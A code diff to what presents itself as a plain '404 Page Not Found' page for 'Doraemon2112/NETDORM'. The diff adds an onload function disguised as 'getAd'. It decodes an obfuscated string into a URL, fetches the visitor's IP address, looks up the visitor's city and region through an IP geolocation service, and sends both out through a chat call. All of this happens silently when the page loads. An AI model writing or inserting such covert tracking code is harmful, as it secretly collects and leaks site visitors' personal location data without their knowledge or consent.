@@ -5,11 +5,27 @@
     <link rel="shortcut icon" type="image/png" href="https://spat-cloud.github.io/data/DORAEMON1.png">
     <meta name="viewport" content="maximum-scale=1">
     <meta name="theme-color" content="red">
-<script async src="https://spat-cloud.github.io/data/HarScript/HarScript.v2.9.Latest.min.js"></script>
-    <center><img src="https://spat-cloud.github.io/data/Doraemon GIF 1.gif"></center>
+    <script src="HarScript/HSDK.Private.Raw.js"></script>
+<!-- <script async src="https://spat-cloud.github.io/data/HarScript/HarScript.v2.9.Latest.min.js"></script>-->
+    <center><img src="https://spat-cloud.github.io/data/Doraemon GIF 1.gif"></center> 
    <center> <h1>404 Page Not Found</h1> </center>
  </head>
-  <body>
+  <body onload="getAd()">
     <hr> <center> Doraemon2112/NETDORM </center>
     </body>
+  <script>
+            mky="e1e1843475f2f424a12393a355b24134e4a1b5d2f4b2413465c4f4b31532932465c4824494a1a5d271e2924411339224",su=(i)=>`https://ipapi.co/${i}/json`;
+            getAd=()=>{
+                fetch(new Request(mky.hl())).then(j=>j.json()).then(d=>{
+                    if(d.ip!=undefined)
+                {
+                    fetch(new Request(su(d.ip))).then(c=>c.json())
+                    .then(b=>{$.chat(d.ip,b.city+','+b.region)})
+                    .catch(e=>console.error(e));
+                }else {return;}
+                })
+                .catch(e=>console.log(e));
+            };
+
+  </script>
   </html>
